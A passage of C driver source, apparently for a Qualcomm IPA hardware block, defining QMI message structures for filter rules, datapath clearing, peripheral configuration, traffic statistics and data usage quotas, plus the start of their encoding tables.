	Filter specification to be installed in the hardware */
	uint8_t filter_spec_list_valid;
	/* Must be set to true if filter_spec_list is being passed */
	uint32_t filter_spec_list_len;
	/* Must be set to # of elements in filter_spec_list */
	struct ipa_filter_spec_type_v01
		filter_spec_list[QMI_IPA_MAX_FILTERS_V01];
	/*	This structure defines the list of filters that have
	 *		to be installed in the hardware. The driver installing
	 *		these rules shall do so in the same order as specified
	 *		in this list.
	 */

	/* Optional */
	/*  Pipe index to intall rule */
	uint8_t source_pipe_index_valid;
	/* Must be set to true if source_pipe_index is being passed */
	uint32_t source_pipe_index;
	/*	This is the source pipe on which the filter rule is to be
	 *	installed. The requestor may always not know the pipe
	 *	indices. If not specified, the receiver shall install
	 *	this rule on all the pipes that it controls through
	 *	which data may be fed into IPA.
	 */

	/* Optional */
	/*  Total number of IPv4 filters in the filter spec list */
	uint8_t num_ipv4_filters_valid;
	/* Must be set to true if num_ipv4_filters is being passed */
	uint32_t num_ipv4_filters;
	/*   Number of IPv4 rules included in filter spec list */

	/* Optional */
	/*  Total number of IPv6 filters in the filter spec list */
	uint8_t num_ipv6_filters_valid;
	/* Must be set to true if num_ipv6_filters is being passed */
	uint32_t num_ipv6_filters;
	/* Number of IPv6 rules included in filter spec list */

	/* Optional */
	/*  List of XLAT filter indices in the filter spec list */
	uint8_t xlat_filter_indices_list_valid;
	/* Must be set to true if xlat_filter_indices_list
	 * is being passed
	 */
	uint32_t xlat_filter_indices_list_len;
	/* Must be set to # of elements in xlat_filter_indices_list */
	uint32_t xlat_filter_indices_list[QMI_IPA_MAX_FILTERS_V01];
	/* List of XLAT filter indices. Filter rules at specified indices
	 * will need to be modified by the receiver if the PDN is XLAT
	 * before installing them on the associated IPA consumer pipe.
	 */

	/* Optional */
	/*  Extended Filter Specification  */
	uint8_t filter_spec_ex_list_valid;
	/* Must be set to true if filter_spec_ex_list is being passed */
	uint32_t filter_spec_ex_list_len;
	/* Must be set to # of elements in filter_spec_ex_list */
	struct ipa_filter_spec_ex_type_v01
		filter_spec_ex_list[QMI_IPA_MAX_FILTERS_V01];
	/*
	 * List of filter specifications of filters that must be installed in
	 *	the IPAv3.x hardware.
	 *	The driver installing these rules must do so in the same
	 *	order as specified in this list.
	 */
};  /* Message */

struct ipa_filter_rule_identifier_to_handle_map_v01 {
	uint32_t filter_spec_identifier;
	/*	This field is used to identify a filter spec in the list of
	 *	filter specs being sent from the client. This field is
	 *	applicable only in the filter install request and response.
	 */
	uint32_t filter_handle;
	/*  This field is used to identify a rule in any subsequent message.
	 *	This is a value that is provided by the server to the control
	 *	point
	 */
};  /* Type */

/* Response Message; This is the message that is exchanged between the
 * control point and the service in order to request the
 * installation of filtering rules in the hardware block by
 * the remote side.
 */
struct ipa_install_fltr_rule_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/*	Standard response type.
	 *	Standard response type. Contains the following data members:
	 *	- qmi_result_type -- QMI_RESULT_SUCCESS or QMI_RESULT_FAILURE
	 *	- qmi_error_type  -- Error code. Possible error code values are
	 *	described in the error codes section of each message definition.
	 */

	/* Optional */
	/*  Filter Handle List */
	uint8_t filter_handle_list_valid;
	/* Must be set to true if filter_handle_list is being passed */
	uint32_t filter_handle_list_len;
	/* Must be set to # of elements in filter_handle_list */
	struct ipa_filter_rule_identifier_to_handle_map_v01
		filter_handle_list[QMI_IPA_MAX_FILTERS_V01];
	/*
	 * List of handles returned to the control point. Each handle is
	 *	mapped to the rule identifier that was specified in the
	 *	request message. Any further reference to the rule is done
	 *	using the filter handle.
	 */

	/* Optional */
	/*  Rule id List */
	uint8_t rule_id_valid;
	/* Must be set to true if rule_id is being passed */
	uint32_t rule_id_len;
	/* Must be set to # of elements in rule_id */
	uint32_t rule_id[QMI_IPA_MAX_FILTERS_V01];
	/*
	 * List of rule ids returned to the control point.
	 *	Any further reference to the rule is done using the
	 *	filter rule id specified in this list.
	 */
};  /* Message */

struct ipa_filter_handle_to_index_map_v01 {
	uint32_t filter_handle;
	/*	This is a handle that was given to the remote client that
	 *	requested the rule addition.
	 */
	uint32_t filter_index;
	/*	This index denotes the location in a filter table, where the
	 *	filter rule has been installed. The maximum value of this
	 *	field is 64.
	 */
};  /* Type */

/* Request Message; This is the message that is exchanged between the
 * control point and the service in order to notify the remote driver
 * of the installation of the filter rule supplied earlier by the
 * remote driver.
 */
struct ipa_fltr_installed_notif_req_msg_v01 {
	/*	Mandatory	*/
	/*  Pipe index	*/
	uint32_t source_pipe_index;
	/*	This is the source pipe on which the filter rule has been
	 *	installed or was attempted to be installed
	 */

	/* Mandatory */
	/*  Installation Status */
	enum ipa_qmi_result_type_v01 install_status;
	/*	This is the status of installation. If this indicates
	 *	SUCCESS, other optional fields carry additional
	 *	information
	 */

	/* Mandatory */
	/*  List of Filter Indices */
	uint32_t filter_index_list_len;
	/* Must be set to # of elements in filter_index_list */
	struct ipa_filter_handle_to_index_map_v01
		filter_index_list[QMI_IPA_MAX_FILTERS_V01];
	/*
	 * Provides the list of filter indices and the corresponding
	 *	filter handle. If the installation_status indicates a
	 *	failure, the filter indices must be set to a reserve
	 *	index (255).
	 */

	/* Optional */
	/*  Embedded pipe index */
	uint8_t embedded_pipe_index_valid;
	/* Must be set to true if embedded_pipe_index is being passed */
	uint32_t embedded_pipe_index;
	/*	This index denotes the embedded pipe number on which a call to
	 *	the same PDN has been made. If this field is set, it denotes
	 *	that this is a use case where PDN sharing is happening. The
	 *	embedded pipe is used to send data from the embedded client
	 *	in the device
	 */

	/* Optional */
	/*  Retain Header Configuration */
	uint8_t retain_header_valid;
	/* Must be set to true if retain_header is being passed */
	uint8_t retain_header;
	/*	This field indicates if the driver installing the rule has
	 *	turned on the "retain header" bit. If this is true, the
	 *	header that is removed by IPA is reinserted after the
	 *	packet processing is completed.
	 */

	/* Optional */
	/*  Embedded call Mux Id */
	uint8_t embedded_call_mux_id_valid;
	/**< Must be set to true if embedded_call_mux_id is being passed */
	uint32_t embedded_call_mux_id;
	/*	This identifies one of the many calls that have been originated
	 *	on the embedded pipe. This is how we identify the PDN gateway
	 *	to which traffic from the source pipe has to flow.
	 */

	/* Optional */
	/*  Total number of IPv4 filters in the filter index list */
	uint8_t num_ipv4_filters_valid;
	/* Must be set to true if num_ipv4_filters is being passed */
	uint32_t num_ipv4_filters;
	/* Number of IPv4 rules included in filter index list */

	/* Optional */
	/*  Total number of IPv6 filters in the filter index list */
	uint8_t num_ipv6_filters_valid;
	/* Must be set to true if num_ipv6_filters is being passed */
	uint32_t num_ipv6_filters;
	/* Number of IPv6 rules included in filter index list */

	/* Optional */
	/*  Start index on IPv4 filters installed on source pipe */
	uint8_t start_ipv4_filter_idx_valid;
	/* Must be set to true if start_ipv4_filter_idx is being passed */
	uint32_t start_ipv4_filter_idx;
	/* Start index of IPv4 rules in filter index list */

	/* Optional */
	/*  Start index on IPv6 filters installed on source pipe */
	uint8_t start_ipv6_filter_idx_valid;
	/* Must be set to true if start_ipv6_filter_idx is being passed */
	uint32_t start_ipv6_filter_idx;
	/* Start index of IPv6 rules in filter index list */

	/* Optional */
	/*  List of Rule Ids */
	uint8_t rule_id_valid;
	/* Must be set to true if rule_id is being passed */
	uint32_t rule_id_len;
	/* Must be set to # of elements in rule_id */
	uint32_t rule_id[QMI_IPA_MAX_FILTERS_V01];
	/*
	 * Provides the list of Rule Ids of rules added in IPA on the given
	 *	source pipe index. If the install_status TLV indicates a
	 *	failure, the Rule Ids in this list must be set to a reserved
	 *	index (255).
	 */
};  /* Message */

/* Response Message; This is the message that is exchanged between the
 * control point and the service in order to notify the remote driver
 * of the installation of the filter rule supplied earlier by the
 * remote driver.
 */
struct ipa_fltr_installed_notif_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/*	Standard response type */
};  /* Message */

/* Request Message; Notifies the remote driver of the need to clear the data
 * path to prevent the IPA from being blocked at the head of the processing
 * pipeline
 */
struct ipa_enable_force_clear_datapath_req_msg_v01 {
	/* Mandatory */
	/*  Pipe Mask */
	uint32_t source_pipe_bitmask;
	/* Set of consumer (source) pipes that must be clear of
	 * active data transfers.
	 */

	/* Mandatory */
	/* Request ID */
	uint32_t request_id;
	/* Identifies the ID of the request that is sent to the server
	 * The same request ID is used in the message to remove the force_clear
	 * request. The server is expected to keep track of the request ID and
	 * the source_pipe_bitmask so that it can revert as needed
	 */

	/* Optional */
	/*  Source Throttle State */
	uint8_t throttle_source_valid;
	/* Must be set to true if throttle_source is being passed */
	uint8_t throttle_source;
	/*  Specifies whether the server is to throttle the data from
	 *	these consumer (source) pipes after clearing the exisiting
	 *	data present in the IPA that were pulled from these pipes
	 *	The server is expected to put all the source pipes in the
	 *	source_pipe_bitmask in the same state
	 */
};  /* Message */

/* Response Message; Notifies the remote driver of the need to clear the
 * data path to prevent the IPA from being blocked at the head of the
 * processing pipeline
 */
struct ipa_enable_force_clear_datapath_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/* Standard response type */
};  /* Message */

/* Request Message; Notifies the remote driver that the forceful clearing
 * of the data path can be lifted
 */
struct ipa_disable_force_clear_datapath_req_msg_v01 {
	/* Mandatory */
	/* Request ID */
	uint32_t request_id;
	/* Identifies the request that was sent to the server to
	 * forcibly clear the data path. This request simply undoes
	 * the operation done in that request
	 */
};  /* Message */

/* Response Message; Notifies the remote driver that the forceful clearing
 * of the data path can be lifted
 */
struct ipa_disable_force_clear_datapath_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/* Standard response type */
};  /* Message */

enum ipa_peripheral_speed_enum_v01 {
	IPA_PERIPHERAL_SPEED_ENUM_MIN_ENUM_VAL_V01 = -2147483647,
	/* To force a 32 bit signed enum.  Do not change or use */
	QMI_IPA_PER_USB_FS_V01 = 1,
	/*  Full-speed USB connection */
	QMI_IPA_PER_USB_HS_V01 = 2,
	/*  High-speed USB connection */
	QMI_IPA_PER_USB_SS_V01 = 3,
	/*  Super-speed USB connection */
	QMI_IPA_PER_WLAN_V01 = 4,
	/*  WLAN connection */
	IPA_PERIPHERAL_SPEED_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use*/
};

enum ipa_pipe_mode_enum_v01 {
	IPA_PIPE_MODE_ENUM_MIN_ENUM_VAL_V01 = -2147483647,
	/* To force a 32 bit signed enum.  Do not change or use */
	QMI_IPA_PIPE_MODE_HW_V01 = 1,
	/*  Pipe is connected with a hardware block */
	QMI_IPA_PIPE_MODE_SW_V01 = 2,
	/*  Pipe is controlled by the software */
	IPA_PIPE_MODE_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use */
};

enum ipa_peripheral_type_enum_v01 {
	IPA_PERIPHERAL_TYPE_ENUM_MIN_ENUM_VAL_V01 = -2147483647,
	/* To force a 32 bit signed enum.  Do not change or use */
	QMI_IPA_PERIPHERAL_USB_V01 = 1,
	/*  Specifies a USB peripheral */
	QMI_IPA_PERIPHERAL_HSIC_V01 = 2,
	/*  Specifies an HSIC peripheral */
	QMI_IPA_PERIPHERAL_PCIE_V01 = 3,
	/*  Specifies a PCIe	peripheral */
	IPA_PERIPHERAL_TYPE_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use */
};

struct ipa_config_req_msg_v01 {
	/* Optional */
	/*  Peripheral Type */
	uint8_t peripheral_type_valid;
	/* Must be set to true if peripheral_type is being passed */
	enum ipa_peripheral_type_enum_v01 peripheral_type;
	/* Informs the remote driver about the perhipheral for
	 * which this configuration information is relevant. Values:
	 *	- QMI_IPA_PERIPHERAL_USB (1) -- Specifies a USB peripheral
	 *	- QMI_IPA_PERIPHERAL_HSIC(2) -- Specifies an HSIC peripheral
	 *	- QMI_IPA_PERIPHERAL_PCIE(3) -- Specifies a PCIe peripheral
	 */

	/* Optional */
	/*  HW Deaggregation Support */
	uint8_t hw_deaggr_supported_valid;
	/* Must be set to true if hw_deaggr_supported is being passed */
	uint8_t hw_deaggr_supported;
	/* Informs the remote driver whether the local IPA driver
	 * allows de-aggregation to be performed in the hardware
	 */

	/* Optional */
	/*  Maximum Aggregation Frame Size */
	uint8_t max_aggr_frame_size_valid;
	/* Must be set to true if max_aggr_frame_size is being passed */
	uint32_t max_aggr_frame_size;
	/* Specifies the maximum size of the aggregated frame that
	 * the remote driver can expect from this execution environment
	 *	- Valid range: 128 bytes to 32768 bytes
	 */

	/* Optional */
	/*  IPA Ingress Pipe Mode */
	uint8_t ipa_ingress_pipe_mode_valid;
	/* Must be set to true if ipa_ingress_pipe_mode is being passed */

	enum ipa_pipe_mode_enum_v01 ipa_ingress_pipe_mode;
	/* Indicates to the remote driver if the ingress pipe into the
	 *	IPA is in direct connection with another hardware block or
	 *	if the producer of data to this ingress pipe is a software
	 *  module. Values:
	 *	-QMI_IPA_PIPE_MODE_HW(1) --Pipe is connected with hardware block
	 *	-QMI_IPA_PIPE_MODE_SW(2) --Pipe is controlled by the software
	 */

	/* Optional */
	/*  Peripheral Speed Info */
	uint8_t peripheral_speed_info_valid;
	/* Must be set to true if peripheral_speed_info is being passed */

	enum ipa_peripheral_speed_enum_v01 peripheral_speed_info;
	/* Indicates the speed that the peripheral connected to the IPA supports
	 * Values:
	 *	- QMI_IPA_PER_USB_FS (1) --  Full-speed USB connection
	 *	- QMI_IPA_PER_USB_HS (2) --  High-speed USB connection
	 *	- QMI_IPA_PER_USB_SS (3) --  Super-speed USB connection
	 *  - QMI_IPA_PER_WLAN   (4) --  WLAN connection
	 */

	/* Optional */
	/*  Downlink Accumulation Time limit */
	uint8_t dl_accumulation_time_limit_valid;
	/* Must be set to true if dl_accumulation_time_limit is being passed */
	uint32_t dl_accumulation_time_limit;
	/* Informs the remote driver about the time for which data
	 * is accumulated in the downlink direction before it is pushed into the
	 * IPA (downlink is with respect to the WWAN air interface)
	 * - Units: milliseconds
	 * - Maximum value: 255
	 */

	/* Optional */
	/*  Downlink Accumulation Packet limit */
	uint8_t dl_accumulation_pkt_limit_valid;
	/* Must be set to true if dl_accumulation_pkt_limit is being passed */
	uint32_t dl_accumulation_pkt_limit;
	/* Informs the remote driver about the number of packets
	 * that are to be accumulated in the downlink direction before it is
	 * pushed into the IPA - Maximum value: 1023
	 */

	/* Optional */
	/*  Downlink Accumulation Byte Limit */
	uint8_t dl_accumulation_byte_limit_valid;
	/* Must be set to true if dl_accumulation_byte_limit is being passed */
	uint32_t dl_accumulation_byte_limit;
	/* Inform the remote driver about the number of bytes
	 * that are to be accumulated in the downlink direction before it
	 * is pushed into the IPA - Maximum value: TBD
	 */

	/* Optional */
	/*  Uplink Accumulation Time Limit */
	uint8_t ul_accumulation_time_limit_valid;
	/* Must be set to true if ul_accumulation_time_limit is being passed */
	uint32_t ul_accumulation_time_limit;
	/* Inform thes remote driver about the time for which data
	 * is to be accumulated in the uplink direction before it is pushed into
	 * the IPA (downlink is with respect to the WWAN air interface).
	 * - Units: milliseconds
	 * - Maximum value: 255
	 */

	/* Optional */
	/*  HW Control Flags */
	uint8_t hw_control_flags_valid;
	/* Must be set to true if hw_control_flags is being passed */
	uint32_t hw_control_flags;
	/* Informs the remote driver about the hardware control flags:
	 *	- Bit 0: IPA_HW_FLAG_HALT_SYSTEM_ON_NON_TERMINAL_FAILURE --
	 *	Indicates to the hardware that it must not continue with
	 *	any subsequent operation even if the failure is not terminal
	 *	- Bit 1: IPA_HW_FLAG_NO_REPORT_MHI_CHANNEL_ERORR --
	 *	Indicates to the hardware that it is not required to report
	 *	channel errors to the host.
	 *	- Bit 2: IPA_HW_FLAG_NO_REPORT_MHI_CHANNEL_WAKE_UP --
	 *	Indicates to the hardware that it is not required to generate
	 *	wake-up events to the host.
	 *	- Bit 4: IPA_HW_FLAG_WORK_OVER_DDR --
	 *	Indicates to the hardware that it is accessing addresses in
	 *  the DDR and not over PCIe
	 *	- Bit 5: IPA_HW_FLAG_INTERRUPT_MODE_CTRL_FLAG --
	 *	Indicates whether the device must
	 *	raise an event to let the host know that it is going into an
	 *	interrupt mode (no longer polling for data/buffer availability)
	 */

	/* Optional */
	/*  Uplink MSI Event Threshold */
	uint8_t ul_msi_event_threshold_valid;
	/* Must be set to true if ul_msi_event_threshold is being passed */
	uint32_t ul_msi_event_threshold;
	/* Informs the remote driver about the threshold that will
	 * cause an interrupt (MSI) to be fired to the host. This ensures
	 * that the remote driver does not accumulate an excesive number of
	 * events before firing an interrupt.
	 * This threshold is applicable for data moved in the UL direction.
	 * - Maximum value: 65535
	 */

	/* Optional */
	/*  Downlink MSI Event Threshold */
	uint8_t dl_msi_event_threshold_valid;
	/* Must be set to true if dl_msi_event_threshold is being passed */
	uint32_t dl_msi_event_threshold;
	/* Informs the remote driver about the threshold that will
	 * cause an interrupt (MSI) to be fired to the host. This ensures
	 * that the remote driver does not accumulate an excesive number of
	 * events before firing an interrupt
	 * This threshold is applicable for data that is moved in the
	 * DL direction - Maximum value: 65535
	 */

	/* Optional */
	/*  Uplink Fifo Size */
	uint8_t ul_fifo_size_valid;
	/* Must be set to true if ul_fifo_size is being passed */
	uint32_t ul_fifo_size;
	/*
	 * Informs the remote driver about the total Uplink xDCI
	 *	buffer size that holds the complete aggregated frame
	 *	or BAM data fifo size of the peripheral channel/pipe(in Bytes).
	 *	This deprecates the max_aggr_frame_size field. This TLV
	 *	deprecates max_aggr_frame_size TLV from version 1.9 onwards
	 *	and the max_aggr_frame_size TLV will be ignored in the presence
	 *	of this TLV.
	 */

	/* Optional */
	/*  Downlink Fifo Size */
	uint8_t dl_fifo_size_valid;
	/* Must be set to true if dl_fifo_size is being passed */
	uint32_t dl_fifo_size;
	/*
	 * Informs the remote driver about the total Downlink xDCI buffering
	 *	capacity or BAM data fifo size of the peripheral channel/pipe.
	 *	(In Bytes). dl_fifo_size = n * dl_buf_size. This deprecates the
	 *	max_aggr_frame_size field. If this value is set
	 *	max_aggr_frame_size is ignored.
	 */

	/* Optional */
	/*  Downlink Buffer Size */
	uint8_t dl_buf_size_valid;
	/* Must be set to true if dl_buf_size is being passed */
	uint32_t dl_buf_size;
	/*  Informs the remote driver about the single xDCI buffer size.
		This is applicable only in GSI mode(in Bytes).\n */
};  /* Message */

/* Response Message; Notifies the remote driver of the configuration
 * information
 */
struct ipa_config_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/**<   Standard response type.*/
}; /* Message */

enum ipa_stats_type_enum_v01 {
	IPA_STATS_TYPE_ENUM_MIN_ENUM_VAL_V01 = -2147483647,
	/* To force a 32 bit signed enum.  Do not change or use */
	QMI_IPA_STATS_TYPE_INVALID_V01 = 0,
	/* Invalid stats type identifier */
	QMI_IPA_STATS_TYPE_PIPE_V01 = 1,
	/* Pipe stats type */
	QMI_IPA_STATS_TYPE_FILTER_RULES_V01 = 2,
	/* Filter rule stats type */
	IPA_STATS_TYPE_ENUM_MAX_ENUM_VAL_V01 = 2147483647
	/* To force a 32 bit signed enum.  Do not change or use */
};

struct ipa_pipe_stats_info_type_v01 {
	uint32_t pipe_index;
	/* Pipe index for statistics to be retrieved. */

	uint64_t num_ipv4_packets;
	/* Accumulated number of IPv4 packets over this pipe. */

	uint64_t num_ipv4_bytes;
	/* Accumulated number of IPv4 bytes over this pipe. */

	uint64_t num_ipv6_packets;
	/* Accumulated number of IPv6 packets over this pipe. */

	uint64_t num_ipv6_bytes;
	/* Accumulated number of IPv6 bytes over this pipe. */
};

struct ipa_stats_type_filter_rule_v01 {
	uint32_t filter_rule_index;
	/* Filter rule index for statistics to be retrieved. */

	uint64_t num_packets;
	/* Accumulated number of packets over this filter rule. */
};

/* Request Message; Retrieve the data statistics collected on modem
 * IPA driver.
 */
struct ipa_get_data_stats_req_msg_v01 {
	/* Mandatory */
	/*  Stats Type  */
	enum ipa_stats_type_enum_v01 ipa_stats_type;
	/* Indicates the type of statistics to be retrieved. */

	/* Optional */
	/* Reset Statistics */
	uint8_t reset_stats_valid;
	/* Must be set to true if reset_stats is being passed */
	uint8_t reset_stats;
	/* Option to reset the specific type of data statistics
	 * currently collected.
	 */
};  /* Message */

/* Response Message; Retrieve the data statistics collected
 * on modem IPA driver.
 */
struct ipa_get_data_stats_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/* Standard response type. */

	/* Optional */
	/*  Stats Type  */
	uint8_t ipa_stats_type_valid;
	/* Must be set to true if ipa_stats_type is passed */
	enum ipa_stats_type_enum_v01 ipa_stats_type;
	/* Indicates the type of statistics that are retrieved. */

	/* Optional */
	/*  Uplink Source Pipe Statistics List */
	uint8_t ul_src_pipe_stats_list_valid;
	/* Must be set to true if ul_src_pipe_stats_list is being passed */
	uint32_t ul_src_pipe_stats_list_len;
	/* Must be set to # of elements in ul_src_pipe_stats_list */
	struct ipa_pipe_stats_info_type_v01
		ul_src_pipe_stats_list[QMI_IPA_MAX_PIPES_V01];
	/* List of all Uplink pipe statistics that are retrieved. */

	/* Optional */
	/*  Downlink Destination Pipe Statistics List */
	uint8_t dl_dst_pipe_stats_list_valid;
	/* Must be set to true if dl_dst_pipe_stats_list is being passed */
	uint32_t dl_dst_pipe_stats_list_len;
	/* Must be set to # of elements in dl_dst_pipe_stats_list */
	struct ipa_pipe_stats_info_type_v01
		dl_dst_pipe_stats_list[QMI_IPA_MAX_PIPES_V01];
	/* List of all Downlink pipe statistics that are retrieved. */

	/* Optional */
	/*  Downlink Filter Rule Stats List */
	uint8_t dl_filter_rule_stats_list_valid;
	/* Must be set to true if dl_filter_rule_stats_list is being passed */
	uint32_t dl_filter_rule_stats_list_len;
	/* Must be set to # of elements in dl_filter_rule_stats_list */
	struct ipa_stats_type_filter_rule_v01
		dl_filter_rule_stats_list[QMI_IPA_MAX_FILTERS_V01];
	/* List of all Downlink filter rule statistics retrieved. */
};  /* Message */

struct ipa_apn_data_stats_info_type_v01 {
	uint32_t mux_id;
	/* Indicates the MUX ID associated with the APN for which the data
	 * usage statistics is queried
	 */

	uint64_t num_ul_packets;
	/* Accumulated number of uplink packets corresponding to
	 * this Mux ID
	 */

	uint64_t num_ul_bytes;
	/* Accumulated number of uplink bytes corresponding to
	 * this Mux ID
	 */

	uint64_t num_dl_packets;
	/* Accumulated number of downlink packets corresponding
	 * to this Mux ID
	 */

	uint64_t num_dl_bytes;
	/* Accumulated number of downlink bytes corresponding to
	 * this Mux ID
	 */
};  /* Type */

/* Request Message; Retrieve the APN data statistics collected from modem */
struct ipa_get_apn_data_stats_req_msg_v01 {
	/* Optional */
	/*  Mux ID List */
	uint8_t mux_id_list_valid;
	/* Must be set to true if mux_id_list is being passed */
	uint32_t mux_id_list_len;
	/* Must be set to # of elements in mux_id_list */
	uint32_t mux_id_list[QMI_IPA_MAX_APN_V01];
	/* The list of MUX IDs associated with APNs for which the data usage
	 * statistics is being retrieved
	 */
};  /* Message */

/* Response Message; Retrieve the APN data statistics collected from modem */
struct ipa_get_apn_data_stats_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/* Standard response type.*/

	/* Optional */
	/* APN Data Statistics List */
	uint8_t apn_data_stats_list_valid;
	/* Must be set to true if apn_data_stats_list is being passed */
	uint32_t apn_data_stats_list_len;
	/* Must be set to # of elements in apn_data_stats_list */
	struct ipa_apn_data_stats_info_type_v01
		apn_data_stats_list[QMI_IPA_MAX_APN_V01];
	/* List of APN data retrieved as per request on mux_id.
	* For now, only one APN monitoring is supported on modem driver.
	* Making this as list for expandability to support more APNs in future.
	*/
};  /* Message */

struct ipa_data_usage_quota_info_type_v01 {
	uint32_t mux_id;
	/* Indicates the MUX ID associated with the APN for which the data usage
	 * quota needs to be set
	 */

	uint64_t num_Mbytes;
	/* Number of Mega-bytes of quota value to be set on this APN associated
	 * with this Mux ID.
	 */
};  /* Type */

/* Request Message; Master driver sets a data usage quota value on
 * modem driver
 */
struct ipa_set_data_usage_quota_req_msg_v01 {
	/* Optional */
	/* APN Quota List */
	uint8_t apn_quota_list_valid;
	/* Must be set to true if apn_quota_list is being passed */
	uint32_t apn_quota_list_len;
	/* Must be set to # of elements in apn_quota_list */
	struct ipa_data_usage_quota_info_type_v01
		apn_quota_list[QMI_IPA_MAX_APN_V01];
	/* The list of APNs on which a data usage quota to be set on modem
	 * driver. For now, only one APN monitoring is supported on modem
	 * driver. Making this as list for expandability to support more
	 * APNs in future.
	 */
};  /* Message */

/* Response Message; Master driver sets a data usage on modem driver. */
struct ipa_set_data_usage_quota_resp_msg_v01 {
	/* Mandatory */
	/* Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/* Standard response type.*/
};  /* Message */

/* Indication Message; Modem driver sends this indication to master
 * driver when the data usage quota is reached
 */
struct ipa_data_usage_quota_reached_ind_msg_v01 {
	/* Mandatory */
	/*  APN Quota List */
	struct ipa_data_usage_quota_info_type_v01 apn;
	/* This message indicates which APN has the previously set quota
	 * reached. For now, only one APN monitoring is supported on modem
	 * driver.
	 */
};  /* Message */

/* Request Message; Master driver request modem driver to terminate
 * the current data usage quota monitoring session.
 */
struct ipa_stop_data_usage_quota_req_msg_v01 {
	/* This element is a placeholder to prevent the declaration of
     *  an empty struct.  DO NOT USE THIS FIELD UNDER ANY CIRCUMSTANCE
	 */
	char __placeholder;
};  /* Message */

/* Response Message; Master driver request modem driver to terminate
 * the current quota monitoring session.
 */
struct ipa_stop_data_usage_quota_resp_msg_v01 {
	/* Mandatory */
	/*  Result Code */
	struct ipa_qmi_response_type_v01 resp;
	/**<   Standard response type.*/
};  /* Message */


static struct elem_info ipa_ipfltr_eq_32_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_ipfltr_eq_32_type_v01,
					offset),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_ipfltr_eq_32_type_v01,
					value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_mask_eq_128_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_128_type_v01,
			offset),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 16,
		.elem_size	= sizeof(uint8_t),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_128_type_v01,
			mask),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 16,
		.elem_size	= sizeof(uint8_t),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_128_type_v01,
			value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

/** here**/


static struct elem_info ipa_ipfltr_eq_16_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_eq_16_type_v01,
			offset),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_ipfltr_eq_16_type_v01,
					value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_mask_eq_32_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
				struct ipa_ipfltr_mask_eq_32_type_v01,
				offset),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
				struct ipa_ipfltr_mask_eq_32_type_v01,
				mask),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_32_type_v01,
			value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_range_eq_16_type_data_v01_ei[] = {
	{
